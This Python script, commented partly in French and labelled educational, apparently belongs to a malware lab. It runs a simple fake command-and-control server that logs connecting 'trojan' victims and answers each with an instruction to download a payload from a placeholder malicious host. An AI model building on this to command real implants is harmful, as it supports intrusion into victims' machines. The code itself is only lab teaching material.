#!/usr/bin/env python3
"""
Fake C2 Server - Educational purposes only
Simulates a Command & Control server response
"""

import socket
import threading
import time

C2_HOST = '0.0.0.0'  # Écoute sur toutes les interfaces
C2_PORT = 8080

def handle_client(client_socket, addr):
    """Handle incoming trojan connection"""
    try:
        # Recevoir la requête
        request = client_socket.recv(4096).decode('utf-8', errors='ignore')
        
        print(f"\n{'='*60}")
        print(f"[+] Connexion reçue de: {addr[0]}:{addr[1]}")
        print(f"{'='*60}")
        print(request)
        print(f"{'='*60}\n")
        
        # Parser le victim ID du POST body
        if '\r\n\r\n' in request:
            body = request.split('\r\n\r\n')[1]
            print(f"[+] Victim ID reçu: {body}")
        
        # Réponse HTTP avec commande de téléchargement
        response = "HTTP/1.1 200 OK\r\n"
        response += "Content-Type: text/plain\r\n"
        response += "Connection: close\r\n"
        response += "\r\n"
        response += "DOWNLOAD: http://malicious-example.com/payload.sh\r\n"
        
        client_socket.send(response.encode())
        print(f"[+] Commande envoyée: DOWNLOAD payload")
        
    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        client_socket.close()

def start_c2_server():
    """Start the fake C2 server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((C2_HOST, C2_PORT))
        server.listen(5)
        
        print(f"""
╔════════════════════════════════════════════════════════════╗
║           FAKE C2 SERVER - EDUCATIONAL ONLY                ║
╚════════════════════════════════════════════════════════════╝

[*] Serveur démarré sur {C2_HOST}:{C2_PORT}
[*] En attente de connexions du trojan...
[*] Appuyez sur Ctrl+C pour arrêter

[!] ATTENTION: Ce serveur simule un C2 malveillant
[!] À utiliser UNIQUEMENT dans un environnement de test
        """)
        
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(client, addr))
            thread.daemon = True
            thread.start()
            
    except KeyboardInterrupt:
        print("\n\n[*] Arrêt du serveur C2...")
    except Exception as e:
        print(f"[-] Erreur serveur: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_c2_server()
